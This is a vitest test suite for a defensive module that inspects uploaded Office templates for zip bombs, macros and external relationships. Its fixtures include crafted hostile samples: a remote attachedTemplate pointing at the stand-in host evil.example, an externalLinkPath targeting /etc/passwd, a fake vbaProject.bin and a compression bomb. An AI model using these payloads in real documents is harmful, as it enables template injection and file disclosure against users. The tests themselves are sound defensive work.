import { describe, it, expect } from 'vitest';
import { Document, Packer, Paragraph, TextRun } from 'docx';
import * as XLSX from 'xlsx';
import PizZip from 'pizzip';
import {
  inspectTemplate,
  parseZipEntries,
  checkBombLimits,
  detectFormat,
  hasMacro,
  findExternalRelThreat,
  checkPlaceholderBudget,
  TEMPLATE_LIMITS,
  type ZipEntry,
} from './template-safety.js';

async function realDocx(): Promise<Buffer> {
  const doc = new Document({
    sections: [{ children: [new Paragraph({ children: [new TextRun('{name}')] })] }],
  });
  return Packer.toBuffer(doc);
}

function realXlsx(): Buffer {
  const wb = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet([['{title}']]), 'Sheet1');
  return XLSX.write(wb, { type: 'buffer', bookType: 'xlsx' }) as Buffer;
}

function craftZip(
  files: Record<string, string | Buffer>,
  compression: 'STORE' | 'DEFLATE' = 'STORE',
): Buffer {
  const zip = new PizZip();
  for (const [name, content] of Object.entries(files)) zip.file(name, content);
  return zip.generate({ type: 'nodebuffer', compression }) as Buffer;
}

function entry(name: string, uncompressed: number, compressed = uncompressed): ZipEntry {
  return { name, method: 8, compressedSize: compressed, uncompressedSize: uncompressed };
}

describe('parseZipEntries', () => {
  it('reads entries from a real docx without inflating', async () => {
    const entries = parseZipEntries(await realDocx());
    const names = entries.map((e) => e.name);
    expect(names).toContain('word/document.xml');
    expect(names).toContain('[Content_Types].xml');
    const docXml = entries.find((e) => e.name === 'word/document.xml')!;
    expect(docXml.uncompressedSize).toBeGreaterThan(0);
  });

  it('throws on a buffer with no central directory', () => {
    const bad = Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.from('xxxxxxxx')]);
    expect(() => parseZipEntries(bad)).toThrow();
  });
});

describe('checkBombLimits (synthetic)', () => {
  it('passes a normal entry set', () => {
    expect(checkBombLimits([entry('a', 1000), entry('b', 2000)], 5000)).toBeNull();
  });

  it('rejects too many entries', () => {
    const many = Array.from({ length: TEMPLATE_LIMITS.maxEntries + 1 }, (_, i) =>
      entry(`e${i}`, 10),
    );
    expect(checkBombLimits(many, 100)?.reason).toBe('too_many_entries');
  });

  it('rejects an oversized single entry', () => {
    const big = entry('huge', TEMPLATE_LIMITS.maxEntryUncompressedBytes + 1, 1000);
    expect(checkBombLimits([big], 1000)?.reason).toBe('entry_too_large');
  });

  it('rejects too-large total uncompressed', () => {
    // many entries each under the per-entry cap but summing over the total cap
    const each = 20 * 1024 * 1024; // 20MB each, under 30MB per-entry cap
    const set = Array.from({ length: 6 }, (_, i) => entry(`p${i}`, each, each));
    expect(checkBombLimits(set, 1000)?.reason).toBe('uncompressed_too_large');
  });

  it('rejects a high compression ratio on a ≥1MB entry', () => {
    const bomb = entry('bomb', 5 * 1024 * 1024, 1000); // ratio ~5000
    expect(checkBombLimits([bomb], 1000)?.reason).toBe('compression_bomb');
  });

  it('does NOT flag a high ratio on a tiny entry (false-positive guard)', () => {
    const tinyXml = entry('small.xml', 50_000, 100); // ratio 500 but < 1MB
    expect(checkBombLimits([tinyXml], 1000)).toBeNull();
  });
});

describe('detectFormat', () => {
  it('sniffs docx / xlsx / pptx from entry names', () => {
    expect(detectFormat([entry('word/document.xml', 1)])).toBe('docx');
    expect(detectFormat([entry('xl/workbook.xml', 1)])).toBe('xlsx');
    expect(detectFormat([entry('ppt/presentation.xml', 1)])).toBe('pptx');
    expect(detectFormat([entry('random.txt', 1)])).toBeNull();
  });
});

describe('hasMacro', () => {
  it('detects a vbaProject.bin entry', () => {
    expect(hasMacro([entry('word/vbaProject.bin', 1)], null)).toBe(true);
  });
  it('detects a macroEnabled content type', () => {
    expect(
      hasMacro(
        [entry('word/document.xml', 1)],
        '<Override ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>',
      ),
    ).toBe(true);
  });
  it('is false for a plain docx', () => {
    expect(hasMacro([entry('word/document.xml', 1)], '<Types/>')).toBe(false);
  });
  it('does NOT match a SheetJS-style .bin Default extension mapping (false-positive guard)', () => {
    // Every plain .xlsx SheetJS writes carries this Default mapping —
    // it contains the substring "macroEnabled" but is NOT a macro part.
    const ct =
      '<Default Extension="bin" ContentType="application/vnd.ms-excel.sheet.binary.macroEnabled.main"/>';
    expect(hasMacro([entry('xl/workbook.xml', 1)], ct)).toBe(false);
  });
});

describe('findExternalRelThreat', () => {
  it('flags a remote attachedTemplate', () => {
    const xml =
      '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/x.dotm" TargetMode="External"/></Relationships>';
    expect(findExternalRelThreat(xml)).toContain('attachedTemplate');
  });

  it('flags an xlsx externalLink', () => {
    const xml =
      '<Relationships><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLinkPath" Target="file:///etc/passwd" TargetMode="External"/></Relationships>';
    expect(findExternalRelThreat(xml)).toContain('externalLinkPath');
  });

  it('does NOT flag a benign external hyperlink', () => {
    const xml =
      '<Relationships><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://holaday.ai" TargetMode="External"/></Relationships>';
    expect(findExternalRelThreat(xml)).toBeNull();
  });

  it('does NOT flag an internal (non-external) relationship', () => {
    const xml =
      '<Relationships><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/></Relationships>';
    expect(findExternalRelThreat(xml)).toBeNull();
  });
});

describe('inspectTemplate (end to end)', () => {
  it('accepts a real docx', async () => {
    const v = inspectTemplate(await realDocx());
    expect(v.ok).toBe(true);
    expect(v.format).toBe('docx');
  });

  it('accepts a real xlsx', () => {
    const v = inspectTemplate(realXlsx());
    expect(v.ok).toBe(true);
    expect(v.format).toBe('xlsx');
  });

  it('rejects a non-zip buffer', () => {
    const v = inspectTemplate(Buffer.from('I am a plain text file, not Office'));
    expect(v.ok).toBe(false);
    expect(v.reason).toBe('not_a_zip');
    expect(v.message).toContain('Office');
  });

  it('rejects an empty buffer', () => {
    expect(inspectTemplate(Buffer.alloc(0)).reason).toBe('not_a_zip');
  });

  it('rejects an over-size file before parsing', () => {
    const big = Buffer.alloc(TEMPLATE_LIMITS.maxFileBytes + 1);
    expect(inspectTemplate(big).reason).toBe('too_large');
  });

  it('rejects a corrupt zip (PK header, no central directory)', () => {
    const bad = Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.alloc(64)]);
    expect(inspectTemplate(bad).reason).toBe('corrupt_zip');
  });

  it('rejects a macro-enabled docx (vbaProject.bin)', () => {
    const buf = craftZip({
      '[Content_Types].xml': '<Types/>',
      'word/document.xml': '<w:document/>',
      'word/vbaProject.bin': 'MZ-fake-macro',
    });
    const v = inspectTemplate(buf);
    expect(v.ok).toBe(false);
    expect(v.reason).toBe('macro_enabled');
  });

  it('rejects a docx with a remote attachedTemplate relationship', () => {
    const buf = craftZip({
      '[Content_Types].xml': '<Types/>',
      'word/document.xml': '<w:document/>',
      'word/_rels/document.xml.rels':
        '<Relationships><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/x.dotm" TargetMode="External"/></Relationships>',
    });
    const v = inspectTemplate(buf);
    expect(v.ok).toBe(false);
    expect(v.reason).toBe('external_relations');
  });

  it('accepts a docx whose only external rel is a benign hyperlink', () => {
    const buf = craftZip({
      '[Content_Types].xml': '<Types/>',
      'word/document.xml': '<w:document/>',
      'word/_rels/document.xml.rels':
        '<Relationships><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://holaday.ai" TargetMode="External"/></Relationships>',
    });
    const v = inspectTemplate(buf);
    expect(v.ok).toBe(true);
    expect(v.format).toBe('docx');
  });

  it('rejects an unrecognised OOXML zip', () => {
    const buf = craftZip({ 'random/file.xml': '<x/>' });
    expect(inspectTemplate(buf).reason).toBe('unsupported_format');
  });

  it('catches a real compression bomb through the full path', () => {
    const buf = craftZip(
      {
        'xl/workbook.xml': '<workbook/>',
        'xl/big.bin': Buffer.alloc(3 * 1024 * 1024), // 3MB of zeros, deflates tiny
      },
      'DEFLATE',
    );
    expect(inspectTemplate(buf).reason).toBe('compression_bomb');
  });
});

describe('checkPlaceholderBudget', () => {
  it('accepts up to the cap', () => {
    expect(checkPlaceholderBudget(TEMPLATE_LIMITS.maxPlaceholders).ok).toBe(true);
  });
  it('rejects over the cap', () => {
    const v = checkPlaceholderBudget(TEMPLATE_LIMITS.maxPlaceholders + 1);
    expect(v.ok).toBe(false);
    expect(v.reason).toBe('too_many_placeholders');
  });
});
